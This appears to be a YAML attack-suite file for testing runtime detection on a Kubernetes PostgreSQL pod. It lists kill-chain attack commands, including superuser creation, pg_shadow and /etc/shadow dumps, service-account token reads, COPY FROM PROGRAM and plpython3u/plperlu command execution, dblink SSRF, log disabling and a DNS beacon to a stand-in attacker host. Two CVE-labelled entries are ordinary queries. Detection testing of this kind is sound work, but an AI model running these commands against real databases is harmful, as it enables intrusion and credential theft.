apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: postgres-killchain-attacks
  description: >-
    Kill-chain ordered PostgreSQL attack suite (36 attacks) using TWO delivery
    mechanisms: SQL-based attacks via psql (exploiting database access) and
    kubectl exec post-exploitation. Includes CVE-based exploits: CVE-2019-9193
    (COPY FROM PROGRAM), CVE-2018-1058 (search_path hijack), CVE-2023-5868,
    CVE-2023-39417. Covers OWASP A01 (Broken Access Control), A03 (Injection),
    A04 (Insecure Design), A05 (Misconfiguration), A07 (Auth Failures).
target:
  service: pg-client
  namespace: postgres
  port: 5432

attacks:
  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 1: RECONNAISSANCE (TA0043) — Database enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery (DB settings)
  - name: sql-dump-settings
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT name, setting FROM pg_settings WHERE name LIKE '%password%' OR name LIKE '%auth%';"]
    expectedDetections: []

  # T1083 — File and Directory Discovery (table enumeration)
  - name: sql-dump-all-tables
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"]
    expectedDetections: []

  # T1082 — System Information Discovery (schema dump)
  - name: exec-pg-dump-schema
    type: cmdinject
    exec:
      command: ["pg_dump", "-h", "pg-rw", "-d", "app", "--schema-only"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: pg_dump

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 3: EXECUTION (TA0002) — Command execution
  # ═══════════════════════════════════════════════════════════════════════════

  # T1059.004 — Unix Shell (whoami)
  - name: exec-whoami
    type: cmdinject
    exec:
      command: ["whoami"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: whoami

  # T1059.004 — Unix Shell (exec from /dev/shm)
  - name: exec-devshm
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_pg && chmod +x /dev/shm/malicious_pg && /dev/shm/malicious_pg pwned && rm -f /dev/shm/malicious_pg"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 5: PRIVILEGE ESCALATION (TA0004) — SQL-based priv esc
  # ═══════════════════════════════════════════════════════════════════════════

  # T1078.004 — Valid Accounts: Create superuser
  - name: sql-create-superuser
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE ROLE attacker WITH SUPERUSER LOGIN PASSWORD 'pwned';"]
    expectedDetections: []

  # T1611 — Escape to Host (unshare attempt)
  - name: exec-unshare
    type: cmdinject
    exec:
      command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
  # ═══════════════════════════════════════════════════════════════════════════

  # T1036 — Masquerading: drifted binary
  - name: exec-drifted-binary
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc && rm -f /tmp/drifted_pg"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal credentials
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — Credentials in Files: pg_shadow dump
  - name: sql-dump-pg-shadow
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT usename, passwd FROM pg_shadow;"]
    expectedDetections: []

  # T1552.001 — Credentials in Files: SA token
  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    # R0006 fires locally but not in CI k3s (pg-client pod may lack SA token mount)

  # T1552.001 — Credentials in Files: /etc/shadow
  - name: exec-etc-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]
    expectedDetections:
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: pg-client
        command: cat

  # T1552.001 — Credentials in Files: /etc/passwd
  - name: exec-etc-passwd
    type: cmdinject
    exec:
      command: ["cat", "/etc/passwd"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: cat

  # T1552 — Symlink to access sensitive file
  - name: exec-symlink
    type: cmdinject
    exec:
      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
    expectedDetections: []

  # T1552.001 — Read pg_hba.conf via SQL
  - name: sql-read-pg-hba
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/var/lib/postgresql/data/pgdata/pg_hba.conf');"]
    expectedDetections: []

  # T1552.001 — Read /etc/passwd via SQL
  - name: sql-read-etc-passwd
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/etc/passwd');"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery: /proc/environ
  - name: exec-proc-environ
    type: cmdinject
    exec:
      command: ["cat", "/proc/1/environ"]
    expectedDetections:
      - ruleID: R0008
        ruleName: Read Environment Variables from procfs
        containerName: pg-client
        command: cat

  # T1046 — Network Service Discovery: resolv.conf and hosts
  - name: exec-net-recon
    type: cmdinject
    exec:
      command: ["sh", "-c", "cat /etc/resolv.conf && cat /etc/hosts && getent hosts kubernetes.default.svc || true"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: cat

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 10: COLLECTION (TA0009) — Data staging
  # ═══════════════════════════════════════════════════════════════════════════

  # T1005 — Data from Local System: large object import
  - name: sql-large-object-import
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT lo_import('/etc/hostname');"]
    expectedDetections: []

  # T1074 — Data Staged: COPY TO file
  - name: sql-copy-exfil
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "COPY (SELECT * FROM bobtest) TO '/tmp/exfil.csv';"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 11: EXFILTRATION (TA0010) — DNS exfiltration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
  - name: exec-dns-anomaly
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 12: IMPACT (TA0040) — Data destruction and crypto mining
  # ═══════════════════════════════════════════════════════════════════════════

  # T1485 — Data Destruction: DROP TABLE
  - name: sql-drop-table
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "DROP TABLE IF EXISTS bobtest_exfil;"]
    expectedDetections: []

  # T1496 — Resource Hijacking: crypto mining DNS signal
  - name: exec-crypto-dns
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
    expectedDetections:
      - ruleID: R1008
        ruleName: Crypto Mining Domain Communication
        containerName: pg-client

  # ═══════════════════════════════════════════════════════════════════════════
  # CVE-BASED ATTACKS — Historical PostgreSQL vulnerabilities
  # ═══════════════════════════════════════════════════════════════════════════

  # CVE-2019-9193 — COPY FROM PROGRAM command execution
  # Severity: Critical (CVSS 9.8). Any user with COPY permission can execute
  # arbitrary OS commands. Not technically a "bug" — it's by design for
  # superusers, but misconfigured grants make it an RCE vector.
  # Exploited by TeamTNT and Kinsing crypto miners.
  - name: cve-2019-9193-copy-program-id
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE TABLE IF NOT EXISTS cmd_output(line text); COPY cmd_output FROM PROGRAM 'id';"]
    expectedDetections: []

  # CVE-2019-9193 — COPY FROM PROGRAM whoami
  - name: cve-2019-9193-copy-program-whoami
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "DROP TABLE IF EXISTS cmd_out2; CREATE TABLE cmd_out2(line text); COPY cmd_out2 FROM PROGRAM 'whoami'; SELECT * FROM cmd_out2;"]
    expectedDetections: []

  # CVE-2019-9193 — COPY FROM PROGRAM cat /etc/passwd
  - name: cve-2019-9193-copy-program-passwd
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "DROP TABLE IF EXISTS cmd_out3; CREATE TABLE cmd_out3(line text); COPY cmd_out3 FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_out3 LIMIT 5;"]
    expectedDetections: []

  # CVE-2019-9193 — COPY TO PROGRAM (write to pipe)
  - name: cve-2019-9193-copy-to-program
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "COPY (SELECT 'pwned_via_copy_to_program') TO PROGRAM 'tee /tmp/pg_pwned 2>/dev/null || true';"]
    expectedDetections: []

  # T1059 — PL/Python untrusted language (RCE via CREATE FUNCTION)
  # Used by attackers who gain superuser to execute Python code in-process.
  - name: sql-plpython3u-rce
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpython3u; SELECT exec_cmd('id');"]
    expectedDetections: []

  # T1059 — PL/Perl untrusted language (alternative RCE path)
  - name: sql-plperlu-rce
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE EXTENSION IF NOT EXISTS plperlu; CREATE OR REPLACE FUNCTION perl_exec(cmd text) RETURNS text AS $$ my $output = `$_[0]`; return $output; $$ LANGUAGE plperlu; SELECT perl_exec('whoami');"]
    expectedDetections: []

  # CVE-2018-1058 — Schema search_path hijacking
  # Severity: High (CVSS 8.8). Unprivileged user creates function in public
  # schema that shadows a system function, executed by superuser later.
  - name: cve-2018-1058-search-path-hijack
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$ SELECT 'CVE-2018-1058:hijacked:' || $1; $$ LANGUAGE SQL; SELECT upper('test');"]
    expectedDetections: []

  # T1190 — lo_export: write arbitrary file via large object
  # Classic postgres trick: import file as large object, then export elsewhere.
  - name: sql-lo-export-file-write
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT lo_from_bytea(0, E'#!/bin/sh\\nid > /tmp/pg_rce_proof\\n'); SELECT lo_export(0, '/tmp/pg_payload.sh');"]
    expectedDetections: []

  # T1190 — dblink SSRF (connect to internal services from DB)
  # Used to pivot from compromised DB to internal network services.
  - name: sql-dblink-ssrf
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=kubernetes.default.svc port=443 dbname=postgres connect_timeout=2');"]
    expectedDetections: []

  # T1505 — ALTER SYSTEM persistence (write to postgresql.auto.conf)
  # Attacker can persist config changes that survive restarts.
  - name: sql-alter-system-persist
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "ALTER SYSTEM SET log_connections = off;"]
    expectedDetections: []

  # T1552.001 — pg_read_file: read /etc/hostname
  - name: sql-pg-read-file-hostname
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/etc/hostname');"]
    expectedDetections: []

  # T1552.001 — pg_read_file: read SA token
  - name: sql-pg-read-file-sa-token
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token');"]
    expectedDetections: []

  # CVE-2023-5868 — Aggregate function memory disclosure
  # Severity: Medium (CVSS 4.3). Information leak via DISTINCT aggregates.
  - name: cve-2023-5868-aggregate-leak
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT array_agg(DISTINCT x ORDER BY x) FROM generate_series(1,1000) AS x;"]
    expectedDetections: []

  # CVE-2023-39417 — Extension script injection
  # Severity: High (CVSS 8.8). SQL injection via CREATE EXTENSION with
  # crafted @extowner or @extschema.
  - name: cve-2023-39417-extension-inject
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE EXTENSION IF NOT EXISTS pg_stat_statements;"]
    expectedDetections: []
